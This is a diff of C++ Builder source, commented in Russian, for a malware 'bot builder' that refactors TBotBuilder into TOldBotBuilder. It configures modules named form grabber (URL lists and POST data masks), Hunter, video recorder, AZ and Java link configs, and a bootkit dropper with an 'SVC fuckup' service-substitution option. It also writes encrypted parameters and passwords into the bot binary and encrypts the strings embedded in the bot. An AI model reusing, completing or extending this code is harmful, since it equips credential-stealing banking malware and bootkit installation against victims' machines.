 		{
-			TBotParam* Param = (TBotParam*)FParams->Items[i];
+			TOldBotParam* Param = (TOldBotParam*)FParams->Items[i];
 
 			if (Param->Active)
 			{
@@ -830,25 +1392,12 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 	Message("");
     Message(Status_BuildCompleted);
 
-	return true;
-}
-//-----------------------------------------------------------------
-
-//-----------------------------------------------------------------
-int __fastcall TBotBuilder::GetCount()
-{
-	return FParams->Count;
-}
-//-----------------------------------------------------------------
-
-TBotParam* __fastcall TBotBuilder::GetParam(int Index)
-{
-	return (TBotParam*)FParams->Items[Index];
+	return true;  */
 }
 //-----------------------------------------------------------------
 
 // Функция записывает данные в буфер
-void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param)
+void __fastcall TOldBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TOldBotParam* Param)
 {
     Message(Status_WriteParam + Param->DisplayName);
 	bool Result = Param->Write(Buf, BufSize);
@@ -859,218 +1408,34 @@ void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* 
 }
 
 
-// Функция проверяет состояние параметров
-TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors, bool FullBuild)
-{
-	TBotParamStatus Result = psOk;
-
-	for (int i = 0; i < FParams->Count; i++)
-	{
-		TBotParam* Param = (TBotParam*)FParams->Items[i];
-		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
-		if (!UseParam) continue;
-
-		TBotParamStatus Status = Param->Status();
-		if (Status == psOk) continue;
-
-		// Более высокое значение статуса означает
-		// большую критичность состояния
-		if (Status > Result)
-			Result = Status;
-
-		// Добавляем строку
-		if (Errors)
-		{
-			UnicodeString Str;
-			switch (Status) {
-				case psWarning: Str = ParamStatus_Warning; break;
-				case psError:   Str = ParamStatus_Error; break;
-			}
-
-			Str += StrNoParamValue;
-			Str += Param->DisplayName;
-
-			Errors->Add(Str);
-        }
-	}
-
-	return Result;
-}
-
 
 // Функция вызывается после изменения значения параметра
-void __fastcall TBotBuilder::ParamValueChanged(TBotParam* Sender)
+void __fastcall TOldBotBuilder::ParamValueChanged(TOldBotParam* Sender)
 {
 	if (Sender == FPrefix)
 	{
 		// Сменился префикс, меняем имя результирующего файла
-		UpdateResultFileName(false);
     }
 }
 
-// Функция собирает имя результирующего файла
-void __fastcall TBotBuilder::UpdateResultFileName(bool Reset)
-{
-	// Сбрасываем настройки
-	if (Reset)
-	{
-		FResultFileName = "";
-		FResultFileNameChanged = false;
-        return;
-	}
-
-	// Если имя файла задалось принудительно то выходим
-	if (FResultFileNameChanged) return;
-
-	if (FSourceFileName.IsEmpty() || FPrefix->IsEmpty())
-	{
-		// Префикс не установлен
-		FResultFileName = "";
-		return;
-    }
-
-	// Собираем имя
-	UnicodeString Path = ExtractFilePath(FSourceFileName);
-	UnicodeString Ext  = ExtractFileExt(FSourceFileName);
-
-	FResultFileName = Path + FPrefix->AsUnicodeString + Ext;
-}
 
 
-void __fastcall TBotBuilder::ClearParams()
+void __fastcall TOldBotBuilder::ClearParams()
 {
 	// Функция очищает данные параметров
 	for (int i = 0; i < FParams->Count; i++)
-		((TBotParam*)FParams->Items[i])->Clear();
+		((TOldBotParam*)FParams->Items[i])->Clear();
 }
 
 
-void __fastcall TBotBuilder::SaveToStream(TStream *Stream)
-{
-
-	// Записываем загоовок файла
-	TBuilderFileHeader H;
-	H.Signature = BUILDER_FILE_SIGNATURE;
-	H.Version   = BUILDER_VERSION;
-	H.Count     = FParams->Count;
-
-	Stream->Write(&H, sizeof(H));
-
-	// Записываем параметры
-	for (int i = 0; i < FParams->Count; i++)
-	{
-		TBotParam* P = (TBotParam*)FParams->Items[i];
-		DWORD NameLen = P->FName.Length();
-
-		// Записываем имя парамера
-		Stream->Write(&NameLen, sizeof(NameLen));
-
-		AnsiString Name = P->FName;
-		Name.Unique();
-		Decrypt(Name.c_str(), Name.c_str());
-
-		Stream->Write(Name.c_str(), NameLen);
-
-		// Записываем данные параметра
-        P->SaveToStream(Stream);
-	}
-}
-
-
-void __fastcall TBotBuilder::LoadFromStream(TStream *Stream)
-{
-	// Загружаем настройки из потока данных
-	ClearParams();
-
-	// Читаем заголовок
-	TBuilderFileHeader H;
-
-	int Readed = Stream->Read(&H, sizeof(H));
-
-	// Проверяем правильность заголовка
-	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
-		throw Exception(Error_InvalidParamsFile);
-
-    // Загружаем настройки параметров
-	for (DWORD i = 0; i < H.Count; i++)
-	{
-		// Читаем имя параметра
-		DWORD NameLen = 0;
-		Stream->Read(&NameLen, sizeof(NameLen));
-
-		AnsiString Name;
-		Name.SetLength(NameLen);
-		Readed = Stream->Read(Name.c_str(), NameLen);
-		if (Readed != NameLen)
-			throw Exception(Error_InvalidParamsFile);
-
-		Decrypt(Name.c_str(), Name.c_str());
-
-		// Читаем данные параметра
-		TBotParam* Param = ParamByName(Name);
-		if (Param)
-			Param->LoadFromStream(Stream);
-		else
-		{
-			// Параметр не найден, пропускаем блок
-			DWORD Size = 0;
-			Stream->Read(&Size, sizeof(Size));
-			Stream->Position = Stream->Position + Size;
-        }
-	}
-
-	UpdateResultFileName(false);
-}
-
-
-void __fastcall TBotBuilder::SaveToFile(const UnicodeString &FileName)
-{
-	TFileStream *S = new TFileStream(FileName, fmCreate);
-	try {
-
-		SaveToStream(S);
-
-	} __finally
-	{
-		delete S;
-	}
-}
-
-
-void __fastcall TBotBuilder::LoadFromFile(const UnicodeString &FileName)
-{
-	TFileStream *S = new TFileStream(FileName, fmOpenRead);
-	try {
-
-		LoadFromStream(S);
-
-	} __finally
-	{
-		delete S;
-	}
-}
-
-
-TBotParam* _fastcall TBotBuilder::ParamByName(const AnsiString &Name)
-{
-	for (int i = 0; i < FParams->Count; i++)
-	{
-		TBotParam* P = (TBotParam*)FParams->Items[i];
-		if (P->FName == Name)
-			return P;
-	}
-	return NULL;
-}
-
-
-void __fastcall TBotBuilder::Message(const UnicodeString &Message)
+void __fastcall TOldBotBuilder::Message(const UnicodeString &Message)
 {
 	if (FOnMessage)
 		FOnMessage(this, Message);
 }
 
 
-void __fastcall TBotBuilder::Message(TStrings *Messages)
+void __fastcall TOldBotBuilder::Message(TStrings *Messages)
 {
 	int Count = Messages->Count;
 	for (DWORD i = 0; i < Count; i++)
@@ -1078,72 +1443,16 @@ void __fastcall TBotBuilder::Message(TStrings *Messages)
 }
 
 
-TBotModule* __fastcall TBotBuilder::AddModule(const char *Name)
+TOldBotModule* __fastcall TOldBotBuilder::AddModule(const char *Name)
 {
-	return new TBotModule(this, Name);
+	return new TOldBotModule(this, Name);
 }
 
 
-void __fastcall TBotBuilder::ActivateModules()
-{
-	// Функция активирует необходимые модули
-	int Count = FModules->Count;
-	for (int i = 0; i < Count; i++)
-	{
-		TBotModule* Module = (TBotModule*)FModules->Items[i];
-		if (Module->Activate((PCHAR)FFile->Memory, FFile->Size))
-        	FActiveModules->Add(Module);
-	}
-}
 
-
-void __fastcall TBotBuilder::DeactivateModules()
-{
-	// Функция деактивирует модули
-	for (int i = FActiveModules->Count - 1; i >= 0; i--)
-	{
-		TBotModule* Module = (TBotModule*)FActiveModules->Items[i];
-		Module->FActive = false;
-		FActiveModules->Delete(i);
-	}
-
-}
-
-int __fastcall TBotBuilder::GetActiveModulesCount()
-{
-	return FActiveModules->Count;
-}
-
-
-TBotModule* __fastcall TBotBuilder::GetActiveModules(int Index)
-{
-	return (TBotModule*)FActiveModules->Items[Index];
-}
-
-
-void __fastcall TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
-{
-	TBotModule* Module = ModuleByName(Name);
-	if (Module)
-        Module->FEdit = Edit;
-}
-
-
-TBotModule*__fastcall TBotBuilder::ModuleByName(const UnicodeString &Name)
-{
-    int Count = FModules->Count;
-	for (int i = 0; i < Count; i++)
-	{
-		TBotModule* Module = (TBotModule*)FModules->Items[i];
-		if (Module->Name == Name)
-			return Module;
-	}
-
-	return NULL;
-}
 //----------------------------------------------------------------------------
 
-void __fastcall TBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw)
+void __fastcall TOldBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw)
 {
 	// Функция шифрует данные библиотек
 	while (true)
@@ -1189,19 +1498,21 @@ void __fastcall TBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Pass
 //-----------------------------------------------------------------------------
 
 
-void __fastcall TBotBuilder::InitializeModules()
+void __fastcall TOldBotBuilder::InitializeModules()
 {
-	TBotModule* Module;
+	TOldBotModule* Module;
 
 
     // Hunter
 	Module = AddModule(Module_Hunter);
-    Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "Ссылки модуля Hunter");
+	Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "Ссылки модуля Hunter");
 
     // Настройки формграбера
 	Module = AddModule(Module_FormGraber);
 	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "Ссылки формграбера");
 	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "Маски пост данных");
+
+
 
 	// Видеорекордер
 	Module = AddModule(Module_VideoRecorder);
@@ -1213,7 +1524,7 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module = AddModule(Module_JavaConfig);
 	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "Ссылки JAVA");
 
-	// Ccskrb AZ
+	// Ссылки AZ
 	Module = AddModule(Module_AzConfig);
 //	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
 //	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
@@ -1243,16 +1554,16 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module = AddModule(Module_BootkitDroper);
 	Module->AddParam(true, false, Param_DroperNamePrefix, 0, "Превикс дропера буткита");
 	Module->AddParam(true, false, Param_TargetPlatform,   0, "Платформа назначения дропера буткита");
-	TBotParam* P = Module->AddParam(true, false, Param_SVCFuckupEnabled, 0, "Использовать SVC подмену дропером буткита");
+	TOldBotParam* P = Module->AddParam(true, false, Param_SVCFuckupEnabled, 0, "Использовать SVC подмену дропером буткита");
 	P->AsAnsiString = "0";
 }
 
 
 
 //****************************************************************************
-//                             TBotParam
+//                             TOldBotParam
 //****************************************************************************
-__fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted,
+__fastcall TOldBotParam::TOldBotParam(TOldBotBuilder* AOwner, bool NotNull, bool Encrypted,
 	const char* Name, DWORD Size, const char* Title)
 	: TCollectionItem((AOwner) ? AOwner->FParams : NULL)
 {
@@ -1281,7 +1592,7 @@ __fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypte
 //-----------------------------------------------------------------------------
 
 
-__fastcall TBotParam::~TBotParam()
+__fastcall TOldBotParam::~TOldBotParam()
 {
 	free(FData);
 	if (FModule)
@@ -1289,38 +1600,21 @@ __fastcall TBotParam::~TBotParam()
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SetSize(DWORD Value)
+void __fastcall TOldBotParam::SetSize(DWORD Value)
 {
 	FSize = Value;
 }
 //-----------------------------------------------------------------------------
 
-bool __fastcall TBotParam::GetActive()
+bool __fastcall TOldBotParam::GetActive()
 {
 	return FModule == NULL || FModule->Active;
 }
 //-----------------------------------------------------------------------------
 
-// Функция возвращает состояние парметра
-TBotParamStatus __fastcall TBotParam::Status()
-{
-	if (FModule && !FModule->Active)
-		return psOk;
-
-	if (IsEmpty())
-	{
-		if (FNotNull)
-			return psError;
-		else
-			return psWarning;
-	}
-	return psOk;
-}
-//-----------------------------------------------------------------------------
-
 
 // Функция возвращает отображаемое имя параметра
-UnicodeString __fastcall TBotParam::GetDisplayName(void)
+UnicodeString __fastcall TOldBotParam::GetDisplayName(void)
 {
 	if (FTitle.IsEmpty())
 		return FName;
@@ -1330,14 +1624,14 @@ UnicodeString __fastcall TBotParam::GetDisplayName(void)
 //-----------------------------------------------------------------------------
 
 // Функция возвращает истину если параметр пустой
-bool __fastcall TBotParam::IsEmpty()
+bool __fastcall TOldBotParam::IsEmpty()
 {
 	return FDataSize == 0;
 }
 //-----------------------------------------------------------------------------
 
 // Функция очищает параметр
-void __fastcall TBotParam::Clear()
+void __fastcall TOldBotParam::Clear()
 {
 	FDataSize = 0;
 	m_memset(FData, 0, FSize + 1);
@@ -1346,7 +1640,7 @@ void __fastcall TBotParam::Clear()
 
 
 // Функция устанавливает значение параметра
-void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
+void __fastcall TOldBotParam::SetValue(PCHAR Value, DWORD ValueSize)
 {
 	Clear();
 
@@ -1369,13 +1663,13 @@ void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
 //-----------------------------------------------------------------------------
 
 
-void __fastcall TBotParam::DoChanged()
+void __fastcall TOldBotParam::DoChanged()
 {
 
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::Changed()
+void __fastcall TOldBotParam::Changed()
 {
 	DoChanged();
 	if (FOwner)
@@ -1384,7 +1678,7 @@ void __fastcall TBotParam::Changed()
 //-----------------------------------------------------------------------------
 
 
-AnsiString __fastcall TBotParam::GetAsAnsiString()
+AnsiString __fastcall TOldBotParam::GetAsAnsiString()
 {
 	AnsiString S = FData;
 	if (FEncrypted)
@@ -1393,82 +1687,28 @@ AnsiString __fastcall TBotParam::GetAsAnsiString()
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SetAsAnsiString(const AnsiString &Value)
+void __fastcall TOldBotParam::SetAsAnsiString(const AnsiString &Value)
 {
     SetValue(Value.c_str(), Value.Length());
 }
 //-----------------------------------------------------------------------------
 
 
-UnicodeString __fastcall TBotParam::GetAsUnicodeString()
+UnicodeString __fastcall TOldBotParam::GetAsUnicodeString()
 {
 	return AsAnsiString;
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SetAsUnicodeString(const UnicodeString &Value)
+void __fastcall TOldBotParam::SetAsUnicodeString(const UnicodeString &Value)
 {
 	AsAnsiString = Value;
 }
 //-----------------------------------------------------------------------------
 
-DWORD __fastcall TBotParam::GetAsLong()
-{
-	int Result = 0;
-	if (FDataSize)
-		TryStrToInt(AsUnicodeString, Result);
-	return Result;
-}
-//-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SetAsLong(DWORD Value)
-{
-	AnsiString S(Value);
-	SetValue(S.c_str(), S.Length());
-}
-//-----------------------------------------------------------------------------
 
-bool __fastcall TBotParam::GetAsBool()
-{
-	return AsAnsiString == "1";
-}
-//-----------------------------------------------------------------------------
-
-void __fastcall TBotParam::SetAsBool(bool Value)
-{
-	AsAnsiString = (Value) ? "1" : "0";
-}
-//-----------------------------------------------------------------------------
-
-void __fastcall TBotParam::SaveToStream(TStream *Stream)
-{
-	// Функция сохраняет данные в поток
-	Stream->Write(&FDataSize, sizeof(FDataSize));
-	if (FDataSize)
-		Stream->Write(FData, FDataSize);
-
-}
-//-----------------------------------------------------------------------------
-
-void __fastcall TBotParam::LoadFromStream(TStream *Stream)
-{
-	// Функция загружает данные из потока
-	Clear();
-	DWORD Size = 0;
-	Stream->Read(&Size, sizeof(Size));
-
-	if (Size > FSize)
-		throw Exception(Error_BigParamDataSize);
-
-	if (Size)
-	{
-		FDataSize = Size;
-		Stream->Read(FData, Size);
-    }
-}
-//-----------------------------------------------------------------------------
-
-UnicodeString __fastcall TBotParam::GetAsStrings()
+UnicodeString __fastcall TOldBotParam::GetAsStrings()
 {
 	// Функция возвращает многострочный текст
 	if (FDataSize == 0)
@@ -1485,7 +1725,7 @@ UnicodeString __fastcall TBotParam::GetAsStrings()
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SetAsStrings(const UnicodeString &Value)
+void __fastcall TOldBotParam::SetAsStrings(const UnicodeString &Value)
 {
 	if (Value.Length() == 0)
 	{
@@ -1502,7 +1742,7 @@ void __fastcall TBotParam::SetAsStrings(const UnicodeString &Value)
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::SaveToStrings(TStrings *Strings)
+void __fastcall TOldBotParam::SaveToStrings(TStrings *Strings)
 {
 	// Функция созраняет данные в набор строк,
 	// Подразумевается, что данные это набор строк разделённых нулём
@@ -1527,7 +1767,7 @@ void __fastcall TBotParam::SaveToStrings(TStrings *Strings)
 }
 //-----------------------------------------------------------------------------
 
-void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
+void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
 {
 	// Функция данные данные из набора строк,
 	// Подразумевается, что данные это набор строк разделённых нулём
@@ -1562,14 +1802,14 @@ void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
 }
 //-----------------------------------------------------------------------------
 
-bool __fastcall TBotParam::Write(PCHAR Buf, DWORD BufSize)
+bool __fastcall TOldBotParam::Write(PCHAR Buf, DWORD BufSize)
 {
 	// Функция записывает своё значение в буфер
 	return DoWrite(Buf, BufSize, FData, FSize);
 }
 //-----------------------------------------------------------------------------
 
-bool __fastcall TBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
+bool __fastcall TOldBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
 {
 	// Функция заполняет нулями своё место в сборке
 	int Pos = Position(Buf, BufSize);
@@ -1581,7 +1821,7 @@ bool __fastcall TBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
 //-----------------------------------------------------------------------------
 
 
-int  __fastcall TBotParam::Position(PCHAR Buf, DWORD BufSize)
+int  __fastcall TOldBotParam::Position(PCHAR Buf, DWORD BufSize)
 {
 	// Функция возвращает позицию параметра в буфере
 	return STR::Pos(Buf, FName.c_str(), BufSize);
@@ -1589,7 +1829,7 @@ int  __fastcall TBotParam::Position(PCHAR Buf, DWORD BufSize)
 //-----------------------------------------------------------------------------
 
 
-bool __fastcall TBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
+bool __fastcall TOldBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
 {
 	// Ищем позицию
 	int Pos = Position(Buf, BufSize);
@@ -1606,73 +1846,11 @@ bool __fastcall TBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD 
 //-----------------------------------------------------------------------------
 
 
-//****************************************************************************
-//                             TBotPassword
-//****************************************************************************
-
-__fastcall TBotPassword::TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
-
-	// Вызываем оригинальный конструктор но учитываем то, что
-	// передаваемое значение будет закодировано и будет в BASE64
-	// кодировке. Резервируем буфер с запасом, но перекроем запись
-	// данных в бота
-	: TBotParam(AOwner, NotNull, Encrypted, Name, Size * 3 + 128, Title)
-
-{
-	FRealSize = Size;
-}
-
-
-
-bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
-{
-	// Перед записью ключа расшифровываем его;
-	AnsiString Key;
-	Key.SetLength(FRealSize);
-
-	// Расшифровываем данные
-	if (!IsEmpty())
-	{
-
-		PCHAR Str = STR::New(AsAnsiString.c_str());
-		DWORD Size = 0;
-		RC2Crypt::Decode(KeyForKey, Str, Size);
-		if (Size >= FRealSize)
-			throw Exception(Error_BigPassword);
-
-        m_memset(Key.c_str(), 0, FRealSize);
-		m_memcpy(Key.c_str(), Str, Size);
-
-		if (Encrypted)
-			Decrypt(Key.c_str(), Key.c_str());
-    }
-
-	DWORD OldSize = Size;
-	SetSize(FRealSize);
-	try
-	{
-		DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
-        
-	} __finally
-	{
-	 	SetSize(OldSize);
-	}
-}
-
-
-bool __fastcall TBotPassword::WriteEmptyData(PCHAR Buf, DWORD BufSize)
-{
-	int Pos = Position(Buf, BufSize);
-	if (Pos < 0) return false;
-
-	m_memset(Buf + Pos, 0, FRealSize);
-	return true;
-}
 
 //****************************************************************************
-//                             TBotModule
+//                             TOldBotModule
 //****************************************************************************
-__fastcall TBotModule::TBotModule(TBotBuilder* AOwner, const char *Name)
+__fastcall TOldBotModule::TOldBotModule(TOldBotBuilder* AOwner, const char *Name)
 	: TCollectionItem(AOwner->FModules)
 {
 	if (STRA::IsEmpty(Name))
@@ -1684,34 +1862,34 @@ __fastcall TBotModule::TBotModule(TBotBuilder* AOwner, const char *Name)
 }
 
 
-__fastcall TBotModule::~TBotModule()
+__fastcall TOldBotModule::~TOldBotModule()
 {
 	delete FParams;
 }
 
 
-TBotParam* __fastcall TBotModule::AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
+TOldBotParam* __fastcall TOldBotModule::AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title)
 {
-	TBotParam* Param = new TBotParam(FBuilder, NotNull, Encrypted, Name, Size, Title);
+	TOldBotParam* Param = new TOldBotParam(FBuilder, NotNull, Encrypted, Name, Size, Title);
 	FParams->Add(Param);
 	Param->FModule = this;
     return Param;
 }
 
-bool __fastcall TBotModule::CanEdit()
+bool __fastcall TOldBotModule::CanEdit()
 {
 	return FParams->Count && FEdit;
 }
 
 
-bool __fastcall TBotModule::Edit()
+bool __fastcall TOldBotModule::Edit()
 {
-	if (FEdit)
-		return FEdit->Execute(this);
+//	if (FEdit)
+//		return FEdit->Execute(this);
 }
 
 
-bool __fastcall TBotModule::Activate(PCHAR Buf, DWORD BufSize)
+bool __fastcall TOldBotModule::Activate(PCHAR Buf, DWORD BufSize)
 {
 	// Функция активирует модуль
 	FActive = false;
@@ -1728,23 +1906,23 @@ bool __fastcall TBotModule::Activate(PCHAR Buf, DWORD BufSize)
 }
 
 
-int __fastcall TBotModule::GetParamsCount()
+int __fastcall TOldBotModule::GetParamsCount()
 {
 	return FParams->Count;
 }
 
-TBotParam* __fastcall TBotModule::GetParams(int Index)
+TOldBotParam* __fastcall TOldBotModule::GetParams(int Index)
 {
-	return (TBotParam*)FParams->Items[Index];
+	return (TOldBotParam*)FParams->Items[Index];
 }
 
 
-TBotParam* __fastcall TBotModule::ParamByName(const AnsiString &Name)
+TOldBotParam* __fastcall TOldBotModule::ParamByName(const AnsiString &Name)
 {
 	// Функция возвращает параметр по его имени
 	for (int i = 0; i < ParamsCount; i++)
 	{
-		TBotParam *P = Params[i];
+		TOldBotParam *P = Params[i];
 		if (P->FName == Name)
 		{
 			return P;
@@ -1758,12 +1936,107 @@ TBotParam* __fastcall TBotModule::ParamByName(const AnsiString &Name)
 //*****************************************************************************
 //   						TBotStringsCryptor
 //*****************************************************************************
-__fastcall TBotStringsEncryptor::TBotStringsEncryptor(TComponent *Owner)
-	: TComponent(Owner)
+__fastcall TBotStringsEncryptor::TBotStringsEncryptor(TCustomBotModule* AOwner)
+	: TBotParam(AOwner, "STRINGS_ENCRYPTOR", 0, false, false, "Шифрованные строки")
 {
-
+    IsDynamic = true;
 }
 //---------------------------------------------------------------------------
+
+//--------------------------------------------------
+//  Функция сохраняет значения параметров в поток
+//--------------------------------------------------
+bool TBotStringsEncryptor::UpdateStatus(LPBYTE Buf, DWORD BufSize)
+{
+	// Находим начало блока шифрованных строк
+	if (!Enabled)
+	{
+		FPosition = -1;
+		return false;
+
+    }
+	PCHAR StartAnchor = ENCRYPTED_STRINGS_BEGIN;
+	PCHAR EndAnchor   = ENCRYPTED_STRINGS_END;
+
+	// Определяем позиции блока шифрованных строк
+	FPosition = STR::Pos(Buf, StartAnchor, BufSize, true);
+
+	if (FPosition < 0) return false;
+
+
+	// Определяем конец блока
+	int End = STR::Pos(Buf + FPosition, EndAnchor, BufSize - FPosition, true);
+	if (End < 0)
+		throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+
+	FEndAnchorPos = FPosition + End;
+
+
+	// Проверяем данные. Цель проверки не допустить повреждения целосности
+	// бота. Считаем, что строки не могут содержать символы с кодом менее 9.
+
+	for (int i = FPosition; i < FEndAnchorPos; i++)
+	{
+		if (Buf[i] > 0 && Buf[i] < 9)
+			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+
+	}
+
+	// Расчитываем размер блока
+	FSize = (FEndAnchorPos - FPosition) + STRA::Length(EndAnchor) + 1;
+
+	return true;
+}
+
+//--------------------------------------------------
+//  Функция шифрует строки
+//--------------------------------------------------
+bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
+{
+	if (FPosition < 0) return false;
+
+    AnsiString Pass = Password->AsString;
+
+	PCHAR StartAnchor = (PCHAR)(Buf + FPosition);
+	PCHAR EndAnchor   = (PCHAR)(Buf + FEndAnchorPos);
+	PCHAR Line = StartAnchor + STRA::Length(StartAnchor) + 1;
+
+	while (Line < EndAnchor)
+	{
+		// Пропускаем лишние нули
+		if (*Line == 0)
+		{
+			Line++;
+			continue;
+		}
+
+		DWORD Len = STRA::Length(Line);
+
+		// Шифруем данные
+		Decrypt(Line, Line);
+
+		// Проверяем правильность шифрования
+		PCHAR Tmp = Line;
+		for (int i = 0; i < Len; i++)
+		{
+			if (*Tmp == 0)
+                throw Exception("Во время шифрования строк прооизошла ошибка");
+
+        	Tmp++;
+		}
+
+		// Переходим к следующей строке
+		Line += Len + 1;
+    }
+
+
+	// Удяляем информацию о маркерах
+	m_memset(StartAnchor, 0, STRA::Length(StartAnchor));
+	m_memset(EndAnchor,   0, STRA::Length(EndAnchor));
+
+	return true;
+}
+
 
 bool TBotStringsEncryptor::Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password)
 {
@@ -1792,24 +2065,9 @@ bool TBotStringsEncryptor::Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password)
 
 	PCHAR Line = Buf + Start;
 
-	while (Line < EndPtr)
-	{
-		if (*Line > 0 && *Line < 9)
-			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
-        Line++;
-    }
-
-
 	// Шифруем данные
-	Line = Buf + Start;
 	while (Line < EndPtr)
 	{
-		// Пропускаем лишние нули
-		if (*Line == 0)
-		{
-			Line++;
-			continue;
-		}
 
 		// Определяем конец строки
 		PCHAR End = Line;
@@ -1818,15 +2076,12 @@ bool TBotStringsEncryptor::Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password)
 		if (End >= EndPtr)
 			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
 
-        // Шифруем данные
-        XORCrypt::Crypt(Password, (LPBYTE)Line, End - Line);
+
 		// Переходим к следующей строке
-        Line = End;
+		Line = End;
     }
 
-	// Удяляем информацию о маркерах
-	m_memset(StartPtr, 0, STRA::Length(StartPtr));
-	m_memset(EndPtr, 0, STRA::Length(EndPtr));
+
 }
 //---------------------------------------------------------------------------
 
@@ -1886,7 +2141,7 @@ bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Resul
 		}
 
 		// Нашли отличие в буферах
-		TCustomParam* Param = FModule->GetParamForPos(Pos);
+		TBotParam* Param = FModule->GetParamForPos(Pos);
 		if (!Param)
 		{
 			// Наёден байт который не относится к найденной позиции
